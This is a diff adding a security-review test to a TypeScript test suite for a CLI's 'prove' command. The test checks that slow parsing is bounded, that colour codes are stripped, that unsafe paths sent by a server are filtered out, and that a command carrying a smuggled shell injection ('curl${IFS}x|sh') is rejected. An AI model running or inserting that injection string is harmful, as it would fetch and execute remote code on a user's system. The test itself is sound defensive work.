@@ -156,4 +156,31 @@ describe("codeceipt prove (roadmap Phase 5d)", () => {
     expect(res.code).toBe(0);
     expect(t.args()).toBe("src/linked.test.ts");
   });
+
+  it("PH5D-06 attack (security review): a long output line, colour codes, a folder or '/' from the server, and shell characters in the command", async () => {
+    const { parseFailingTests } = await import("./check-run");
+    const started = Date.now();
+    expect(parseFailingTests(`FAIL x${" ".repeat(199_990)}y`)).toEqual([expect.any(String)]);
+    expect(Date.now() - started).toBeLessThan(500);
+    expect(parseFailingTests("\u001b[31mFAIL\u001b[39m src/a.test.ts > adds")).toEqual([
+      "src/a.test.ts > adds",
+    ]);
+    expect(
+      withTestFiles("npx vitest run --reporter=dot;curl${IFS}x|sh;echo", ["a.test.ts"], "linux"),
+    ).toBeNull();
+    expect(withTestFiles("npx vitest run --reporter=dot", ["a.test.ts"], "win32")).toBe(
+      "npx vitest run --reporter=dot a.test.ts",
+    );
+    const t = setup();
+    linkRepo(t.repo, t.configFile, {
+      apiUrl: "https://codeceipt.example",
+      projectId: PROJECT,
+      token: ["pb", "_", "testtoken123"].join(""),
+    });
+    const res = await t.run(["prove", "--for", "checkout"], async () =>
+      Response.json({ ok: true, tests: ["/", ".", "", "src", "src/linked.test.ts"] }),
+    );
+    expect(res.code).toBe(0);
+    expect(t.args()).toBe("src/linked.test.ts");
+  });
 });
